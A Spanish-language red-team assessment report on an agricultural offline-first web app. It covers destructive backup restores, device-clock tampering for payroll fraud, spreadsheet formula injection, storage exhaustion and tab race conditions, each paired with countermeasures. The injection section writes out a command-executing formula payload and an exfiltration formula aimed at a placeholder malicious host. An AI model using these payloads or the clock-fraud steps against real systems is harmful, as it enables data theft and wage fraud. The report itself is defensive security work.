# INFORME DE EVALUACIÓN RED TEAM — RESILIENCIA, SEGURIDAD Y CASOS EXTREMOS
**Objetivo:** NexoCampo PWA Offline-First (v18.1.9)  
**Alcance:** Vectores adversarios, fallos catastróficos en campo, manipulación de datos, fraude de horas, inyección y resiliencia offline.  
**Fecha:** 2026-10-20  
**Clasificación:** Confidencial / Auditoría Técnica de Seguridad y Estrés  

---

## 1. RESUMEN EJECUTIVO DEL RED TEAM

Se ejecutó un ejercicio de **Red Teaming (Simulación Adversaria y Pruebas de Estrés)** enfocado en la naturaleza particular de NexoCampo: una Progressive Web App agrícola que opera en condiciones extremas de campo abierto, bajo conectividad intermitente o nula, y con supervisión centralizada de cuadrilla.

### Veredicto Global de Resiliencia:
* **Integridad Matemática del Núcleo:** **ALTA.** El motor desacoplado de dominio resiste manipulaciones algebraicas comunes (división por cero, cantidades negativas, superación de meta al 120%, tiempos efectivos nulos).
* **Seguridad en Restauración de Respaldos JSON:** **CRÍTICA (VULNERABLE).** La función de restauración ejecuta `os.clear()` antes de validar íntegramente el lote de datos y carece de firma criptográfica o HMAC, permitiendo envenenamiento de catálogos y pérdida destructiva de datos.
* **Integridad Temporal / Fraude de Horas:** **MEDIA-ALTA (VULNERABLE).** El sistema confía en el reloj local del dispositivo (`new Date()` o inputs de hora). Un supervisor puede alterar la hora del smartphone Android para falsear aperturas de jornada o justificar retardos extemporáneos.
* **Inyección de Fórmulas (CSV / Export Injection):** **ALTA (VULNERABLE).** Los campos abiertos de texto (notas de justificación, descripciones de incidentes) permiten la inserción de prefijos ejecutables (`=`, `@`, `+`, `-`) que detonarían código malicioso al abrir los reportes en Microsoft Excel o Google Sheets.

---

## 2. VECTORES DE ATAQUE Y ESCENARIOS ADVERSARIOS

```
                                  MAPA DE SUPERFICIE DE ATAQUE
                                ┌───────────────────────────────┐
                                │     NEXOCAMPO PWA CLIENT      │
                                └───────┬───────────────┬───────┘
                                        │               │
                    ┌───────────────────┴───┐       ┌───┴───────────────────┐
                    ▼                       ▼       ▼                       ▼
            [VECTOR 1: STORAGE]     [VECTOR 2: TIME] [VECTOR 3: INJECTION]  [VECTOR 4: SYNC]
            - JSON Poisoning        - Clock Tamper   - CSV/Excel Formula    - Replay Attacks
            - Quota Exhaustion      - Ghost Hours    - XSS in Notes         - Payload Tampering
            - Destructive Restore   - Midnight Wrap  - Catalog Corruption   - Phantom Records
```

---

### VECTOR 1: ENVENENAMIENTO DE RESPALDOS Y DESTRUCCIÓN ATÓMICA (JSON POISONING)
* **Puntuación de Riesgo CVSS 3.1:** **8.1 (Alto) — CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H**
* **Mecanismo:** La función `restaurarBackupCanónicoJSON()` en `src/domain/nexocampoDB.ts` ejecuta `os.clear()` de forma inmediata e incondicional sobre los 6 almacenes tan pronto se abre la transacción:
  ```ts
  const restaurarColeccion = (nombre: StoreName, items?: any[]) => {
    if (!Array.isArray(items)) return;
    const os = tx.objectStore(nombre);
    os.clear(); // <-- BORRADO TOTAL PREVIO
    items.forEach((it) => {
      if (it && it.id) os.put(it);
    });
  };
  ```
* **Simulación del Ataque:**
  1. El atacante o usuario provee un archivo JSON con `stores.colaboradores` corrupto o con 10,000 registros malformados sin `id`.
  2. `os.clear()` vacía la base de datos local preexistente.
  3. Los registros no se insertan o la transacción falla a mitad del proceso.
  4. **Impacto:** Pérdida permanente e irrecuperable de semanas de jornadas y asistencias sin posibilidad de rollback ni snapshot de seguridad previo.
* **Contramedida Red Team:**
  - Implementar validación previa en memoria de todo el esquema antes de tocar IndexedDB.
  - Crear un respaldo temporal automático (`snapshot_pre_restore`) antes de invocar `os.clear()`.
  - Requerir firma o hash SHA-256 de integridad en los archivos `.json` exportados.

---

### VECTOR 2: MANIPULACIÓN DE RELOJ Y HORAS FANTASMA (TIME-TRAVEL FRAUD)
* **Puntuación de Riesgo CVSS 3.1:** **6.5 (Medio) — CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N**
* **Mecanismo:** El dispositivo Android en campo opera desconectado de servidores NTP durante horas. Las validaciones de timestamps se basan en `new Date().toISOString()` o en horas manuales ingresadas en inputs `HH:mm`.
* **Simulación del Ataque:**
  1. A las 11:30 a. m., el supervisor descubre que olvidó registrar el pase de lista de las 06:30 a. m.
  2. Retrasa manualmente el reloj del sistema operativo Android a las 06:25 a. m.
  3. Marca a colaboradores ausentes como presentes con timestamp oficial aparentemente válido.
  4. Posteriormente, registra labores con horas consecutivas que en realidad nunca se ejecutaron en el predio.
* **Impacto:** Fraude en liquidación de nómina agrícola y distorsión de tiempos estándar sin trazabilidad física verificable.
* **Contramedida Red Team:**
  - Registrar simultáneamente `horaDeclarada` y `deviceUptime` (`performance.now()`).
  - Utilizar el Service Worker para registrar un monotonic clock continuo que detecte saltos hacia atrás en el reloj del sistema.
  - Al sincronizar con el backend, comparar el timestamp del cliente con el timestamp del servidor (`serverReceivedAt`) y marcar discrepancias superiores a $\pm 15$ minutos como "Registro con Discrepancia Horaria".

---

### VECTOR 3: INYECCIÓN DE FÓRMULAS EN REPORTES (CSV / SPREADSHEET FORMULA INJECTION)
* **Puntuación de Riesgo CVSS 3.1:** **7.8 (Alto) — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N**
* **Mecanismo:** La aplicación permite ingresar texto libre en campos como:
  - `notaSupervisorJustificacion` (máx. 120 caracteres).
  - `incidenteDescripcion`.
  - Nombres y observaciones de labores en Oficios Varios.
* **Simulación del Ataque:**
  1. Un usuario malicioso o supervisor escribe en la justificación:
     `=cmd|'/C calc'!A0` o `=HYPERLINK("http://malicioso.com/exfiltrar?d="&A1; "Detalle")`.
  2. La PWA exporta el consolidado a formato CSV o tabla para auditoría de nómina.
  3. El departamento administrativo abre el archivo `.csv` en Microsoft Excel o LibreOffice.
  4. La hoja de cálculo interpreta el carácter `=` inicial como una fórmula ejecutable, permitiendo ejecución de comandos remotos o exfiltración silenciosa de datos de colaboradores.
* **Contramedida Red Team:**
  - Sanitizar toda exportación tabular prefijando un apóstrofe `'` o espacio a cualquier cadena que inicie con `=`, `+`, `-`, `@`, `\t` o `\r`.
  - Escapar caracteres de control antes de serializar a formatos planos.

---

### VECTOR 4: AGOTAMIENTO DE CUOTA Y DENEGACIÓN DE SERVICIO LOCAL (QUOTA EXHAUSTION DOS)
* **Puntuación de Riesgo CVSS 3.1:** **5.5 (Medio) — CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H**
* **Mecanismo:** En navegadores móviles (especialmente WebKit/Safari en iOS con cuota restrictiva por defecto), el almacenamiento no persistente puede ser purgado por el sistema operativo si la memoria se satura.
* **Simulación del Ataque:**
  1. En una campaña intensa, se acumulan cientos de registros con fotos de incidentes o respaldos masivos no purgados.
  2. IndexedDB supera el límite asignado o el dispositivo entra en "Almacenamiento Casi Lleno".
  3. La próxima llamada a `dbPut` dispara una excepción `QuotaExceededError`.
  4. Dado que no todos los métodos capturan y manejan específicamente este error, la interfaz queda en estado bloqueado o pierde silenciosamente los nuevos registros.
* **Contramedida Red Team:**
  - Solicitar explícitamente persistencia persistente al navegador mediante:  
    `navigator.storage.persist()`.
  - Monitorear cuota activa vía `navigator.storage.estimate()` y alertar cuando se supere el 80% del espacio disponible.

---

### VECTOR 5: CONDICIÓN DE CARRERA EN PESTAÑAS MÚLTIPLES (RACE CONDITIONS & DUPES)
* **Puntuación de Riesgo CVSS 3.1:** **4.7 (Medio) — CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N**
* **Mecanismo:** Un supervisor abre NexoCampo en dos pestañas del navegador del smartphone o en la PWA instalada y una pestaña de Chrome en paralelo.
* **Simulación del Ataque:**
  1. En la Pestaña A marca al colaborador `COL-001` como *Presente*.
  2. Simultáneamente en la Pestaña B marca al mismo colaborador como *Ausencia (Incapacidad)*.
  3. La clave compuesta `${colaboradorId}_${fecha}` en el store `asistencia` sufre una sobrescritura silenciosa basada en "última escritura gana" (*Last-Write-Wins*), sin control de versión (`_rev`) ni candado concurrente (`Web Locks API`).
* **Contramedida Red Team:**
  - Utilizar `navigator.locks.request()` para transacciones críticas de pase de lista y consolidación de jornada.
  - Implementar versionado por registro (`version: number`) y detección de conflictos.

---

## 3. MATRIZ DE RIESGOS Y RESUMEN ADVERSARIO

| Vector Adversario | Componente Afectado | Severidad CVSS | Probabilidad en Campo | Impacto Operativo | Estado |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Borrado destructivo sin rollback en restore JSON** | `nexocampoDB.ts` (`restaurarBackup`) | **CRÍTICA (8.1)** | Media | Pérdida definitiva de datos históricos | **VULNERABLE** |
| **Inyección de fórmulas en exportación CSV / Excel** | `ReportesModulo` / `Respaldos` | **ALTA (7.8)** | Alta | Ejecución no autorizada en PCs de nómina | **VULNERABLE** |
| **Manipulación del reloj de Android para falseo horario** | `jornadaCalculator` / inputs | **MEDIA (6.5)** | Alta | Fraude en horas y asistencia | **VULNERABLE** |
| **Desbordamiento de cuota de almacenamiento local** | IndexedDB / Cache Storage | **MEDIA (5.5)** | Media | Congelamiento de app y fallas de guardado | **PARCIAL** |
| **Condición de carrera entre pestañas concurrentes** | `asistencia` / `jornadas` | **MEDIA (4.7)** | Media | Sobrescritura silenciosa de registros | **VULNERABLE** |
| **División por cero en rendimientos con tiempo 0** | `rendimientoCalculator.ts` | **BAJA (2.1)** | Muy Baja | Crash por NaN | **MITIGADO (100% Protegido)** |
| **Superación de meta física (> 100%)** | `rendimientoCalculator.ts` | **BAJA (1.5)** | Nula | Truncamiento artificial de eficiencia | **MITIGADO (100% Protegido)** |
| **Colaborador con más de 6 operarios en cubiertas** | `formValidators.ts` | **BAJA (2.0)** | Baja | Asignación ilegal de personal | **MITIGADO (100% Protegido)** |

---

## 4. PLAN DE FORTALECIMIENTO Y HARDENING (RECOMENDACIONES)

1. **Hardening de Respaldos (Prioridad 1):**
   - Validar el esquema completo contra un validador estricto antes de ejecutar cualquier transacción de borrado.
   - Guardar una copia temporal en `indexedDB.open('nexocampo_safety_snapshot')` antes de restaurar.
2. **Sanitización contra Inyección de Hojas de Cálculo (Prioridad 1):**
   - Implementar función sanitizadora `sanitizarParaCSV(valor: string)` que anteponga comillas simples a cadenas con operadores aritméticos.
3. **Control de Deriva Temporal (Prioridad 2):**
   - Guardar `performance.now()` acumulado y verificar que la hora del sistema no retroceda en la misma sesión.
4. **Persistencia Durable (Prioridad 2):**
   - Solicitar `navigator.storage.persist()` en el arranque para garantizar que Android y Chrome no expulsen los datos locales durante limpiezas automáticas de memoria caché.
5. **Detección de Colisiones Concurrentes (Prioridad 3):**
   - Implementar `BroadcastChannel` para notificar a otras pestañas activas cuando un registro sea actualizado.

---

> **CONCLUSIÓN DEL RED TEAM:** El motor agronómico y las reglas matemáticas demostraron una resistencia impecable frente a valores límite y entradas anómalas. Las principales vulnerabilidades radican en la ausencia de barreras contra manipulación intencionada de archivos JSON y la falta de sanitización en cadenas de texto libre destinadas a reportes externos.
